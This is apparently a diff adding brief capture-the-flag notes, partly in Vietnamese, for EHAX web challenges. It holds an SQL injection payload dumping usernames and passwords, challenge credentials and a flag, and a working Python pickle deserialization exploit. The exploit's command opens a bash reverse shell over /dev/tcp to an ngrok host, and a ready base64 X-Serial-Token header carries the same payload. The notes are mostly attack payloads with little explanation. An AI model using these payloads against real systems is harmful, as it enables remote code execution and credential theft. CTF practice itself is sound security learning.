@@ -1,0 +1,43 @@
+%' UNION SELECT username, password, id, null from users;--
+- puzzle 15
+http://chall.ehax.tech:8001/fl4g_i5_you_c4n7_s33_m3
+header: hmmm
+EH4X{h499y_u_s0lv3d_15_9uzz13_100_7im35}
+
+- serialize:
+
+https://l.facebook.com/l.php?u=https%3A%2F%2Fenkhee-osiris.github.io%2FDecoder-JSFuck%2F%3Ffbclid%3DIwZXh0bgNhZW0CMTAAAR08czHwBHT92i7SmvT-RgdzCq_yHV9DBSPjwR5CD7hhlL67ORBMnGnt_9U_aem_nD7Ftsb7K-u_ytzWP7-84g&h=AT3-KTdBerXaOJFkMKhXnZhAc8nB1Emv4WPrBVB4iFTIbvWe2JVXm0yI9XVgRQ6HZyEHrN1UvkQA_zJVlxsQuRtxN91XG-IubTYyhVVZUVEiFWFald_0aPZdAfCgP0wOBvWjdhdeVJ0bKjw3ZXxRzA
+
+dung tool này để decode, ta ra:
+
+'dreky'&&_0x12fab0['value']=='ohyeahboiiiahhuhh'?
+
+use this username and pass to login, then go to style.css of part 1, we have:
+
+http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7
+
+payload created: 
+```
+#!/usr/bin/python
+
+import pickle
+import base64
+import requests
+import sys
+
+class PickleRCE(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+command = 'bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/14553 0>&1"'  
+ 
+payload = base64.b64encode(pickle.dumps(PickleRCE()))  
+print(payload)
+```
+Then add a X-serial-token like this in part 2:
+X-Serial-Token: gASVVQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDpiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzE0NTUzIDA+JjEilIWUUpQu
+
+"Tất cả đều phải làm trên linux"
+
+get flag btw
